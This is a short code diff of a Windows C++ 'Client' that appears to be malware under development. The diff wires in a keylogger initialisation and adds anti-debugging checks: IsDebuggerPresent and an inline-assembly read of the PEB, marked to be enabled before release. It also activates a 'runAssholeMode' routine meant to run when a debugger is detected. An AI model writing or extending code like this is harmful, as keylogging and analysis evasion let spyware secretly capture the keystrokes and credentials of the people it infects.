@@ -1,6 +1,6 @@
 #include <Client.hh>
 
-Client::Client() : _running(true), _assholeMode(true)
+Client::Client() : _running(true), _assholeMode(false)
 {
 }
 
@@ -17,11 +17,26 @@ bool Client::init(HINSTANCE instance)
 		OutputDebugString("Error Win Init\n");
 		return (false);
 	}
+	this->_keylogger.init();
 	return (true);
 }
 
 bool Client::setProtection()
 {
+	return (true);
+	// supprimer avant release
+	PPEB ppeb = NULL;
+	if (IsDebuggerPresent())
+	{
+		this->_assholeMode = true;
+		return (false);
+	}
+	__asm
+	{
+		mov eax, fs:[18h]
+		mov eax, [eax+30h]
+		mov ppeb, eax
+	}
 	if (IsDebuggerPresent())
 	{
 		this->_assholeMode = true;
@@ -35,13 +50,15 @@ void Client::run()
 	// Add Thread Connexion
 	while (this->isRunning())
 	{
-		//this->_running = false;
+		if (!GetMessage(&this->_msg, NULL, 0, 0))
+			this->_running = false;
+		TranslateMessage(&this->_msg);
+		DispatchMessage(&this->_msg);
 	}
 }
 
 void Client::runAssholeMode()
 {
-	return ;
 	HWND	win;
 	while (1)
 	{
